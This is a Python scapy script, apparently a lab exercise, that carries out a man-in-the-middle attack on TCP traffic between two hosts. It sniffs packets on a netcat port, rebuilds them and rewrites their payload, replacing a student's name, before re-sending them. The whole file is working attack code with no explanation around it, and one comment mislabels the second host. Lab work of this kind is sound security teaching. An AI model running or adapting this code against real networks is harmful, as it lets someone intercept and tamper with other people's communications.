#!/usr/bin/env python3
from scapy.all import *

iface_ = 'eth0'
hostA = '10.9.0.5'  #IP address for host A
hostB = '10.9.0.6'  #IP address for host A
port = '9090'       #netcat port

def main():   
    filter_ = f'tcp port {port} && (not ether src 02:42:0a:09:00:69)'
    sniff(iface = iface_, filter = filter_, prn = spoof_pkt)
    
def spoof_pkt(pkt):
    if pkt[IP].src == hostA and pkt[IP].dst == hostB:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        
        # Check for payload and replace first occurence of my name with 'a'
        if pkt[TCP].payload:
            data = (pkt[TCP].payload.load).decode().lower()
            newdata = re.sub('ifeanyi', 'aaaaaaa', data, 1)
            send(newpkt / Raw(load = newdata), verbose=0)
        else:
            send(newpkt, verbose=0)
    elif pkt[IP].src == hostB and pkt[IP].dst == hostA:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        
        # Check for payload and replace first occurence of my name with 'b'
        if pkt[TCP].payload:
            data = (pkt[TCP].payload.load).decode().lower()
            newdata = re.sub('ifeanyi', 'bbbbbbb', data, 1)
            send(newpkt / Raw(load = newdata), verbose=0)
        else:
            send(newpkt, verbose=0)
         
                
if __name__ == '__main__':
    main()
